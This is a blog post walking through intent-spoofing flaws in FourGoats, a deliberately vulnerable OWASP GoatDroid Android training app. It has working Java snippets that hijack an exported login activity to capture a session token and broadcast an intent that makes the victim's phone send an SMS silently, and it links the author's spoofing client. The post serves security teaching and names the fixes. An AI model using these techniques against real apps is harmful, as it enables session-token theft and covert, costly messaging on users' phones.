+++
author = "pwntester"
date = 2012-11-17T09:18:00Z
description = ""
draft = false
slug = "fourgoats-vulnerabilities-intent-spoofing"
title = "FourGoats Vulnerabilities: Intent Spoofing"

+++

The Android platform enables an inter application communication that can cause side effects in the security of our application. If a component allows any application to send him intents, we can end up being a puppet on any malware hands.

In order to prevent this situation, the Android platform enables two controls to limit who can talk to you application components. These controls are:

* Permissions
* Intents types

The first one is obvious, the component can request the calling application to present a specific permission in order to call your application.

The second one define two different type of intents:

* Explicit intents are sent to an specific component and only delivered to him</li>
* Implicit intents request an action to be done and ask the system to look for the better component to perform that action. If the component is an Activity, the system will present the user a list with all the activities registered to handle that specific action. If the component is a service, it will be randomly delivered to any of them. Finally, if the component is a broadcast receiver, the system will deliver a copy to all of them.

One interesting fact is that any component is private by default. so far so good. Problems begin when a developer register a component to handle any implicit intent by declaring an intent-action. All of a sudden, that component will immediately become public with no notification to the developer. If the developer wants to keep that component private, he must declare explicitly that component as non exported.

Now, let have a look to the fourGoats app and check what applications are public. We can find three explicitly exported components:

```
<activity
android:name=".activities.ViewCheckin"
android:exported="true"
android:label="@string/view_checkin" >
</activity>

<activity
android:name=".activities.ViewProfile"
android:exported="true"
android:label="@string/profile" >
</activity>

<activity
android:name=".activities.SocialAPIAuthentication"
android:exported="true"
android:label="@string/authenticate" >
</activity>
```

and if we look for implicitly exported components we will find another two:

```
<service android:name=".services.LocationService" >
<intent-filter>
<action android:name="org.owasp.goatdroid.fourgoats.services.LocationService" />
</intent-filter>
</service>

<receiver
android:name=".broadcastreceivers.SendSMSNowReceiver"
android:label="Send SMS" >
<intent-filter>
<action android:name="org.owasp.goatdroid.fourgoats.SOCIAL_SMS" />
</intent-filter>
</receiver>
```

As they (intentionally or not) declared public, lets see what can we do with them.

**SocialAPIAuthentication**

Reviewing the SocialAPIAuthentication activity, it seems that it present a login form to the user, performs the authentication and if its validated by the server, it returns a session token.

Now, let see how can we get a session token from any other app by presenting the user the same activity and ask him to enter its credentials:

```
Intent tokenIntent = new Intent();
tokenIntent.setComponent(new ComponentName("org.owasp.goatdroid.fourgoats","org.owasp.goatdroid.fourgoats.activities.SocialAPIAuthentication"));
startActivityForResult(tokenIntent, STATIC_INTEGER_VALUE);
```

Now we need to handle the call back:

```
@Override
public void onActivityResult(int requestCode, int resultCode, Intent data) {
  super.onActivityResult(requestCode, resultCode, data);
  switch(requestCode) {
    case (STATIC_INTEGER_VALUE) : {
      if (resultCode == Activity.RESULT_OK) {
        Log.w("alvms", "4Goats SessionToken: " + data.getStringExtra("sessionToken"));
      }
      break;
    }
  }
}
```

Ok, it doesn't look a big deal since the malware app can also fake the login form and get the credentials if the user is willing to authenticate himself from another application, lets see another abuse case

**SendSMSNowReceiver**

Ok, so this receiver is registered to handle the action: org.owasp.goatdroid.fourgoats.SOCIAL_SMS but the developer forgot to declare the component as private so it will be automatically be registered in the system as public because it handles an implicit action.

So if its public, we can call it:

```
Intent broadcastIntent=new Intent();
broadcastIntent.setAction("org.owasp.goatdroid.fourgoats.SOCIAL_SMS");
broadcastIntent.putExtra("phoneNumber","0034666666666");
broadcastIntent.putExtra("message","Hi");
sendBroadcast(broadcastIntent)
```

And voila, we are sending an SMS from the user phone without him noticing.

If the developer meant this component to be public but protect it from being call from any application, he needs to declare a strong permission so only those apps with that permission granted can call that component.

You can find the intent spoofer client here:

[https://github.com/pwntester/OWASP-GoatDroid-Dolphis](https://github.com/pwntester/OWASP-GoatDroid-Dolphis)

Enjoy
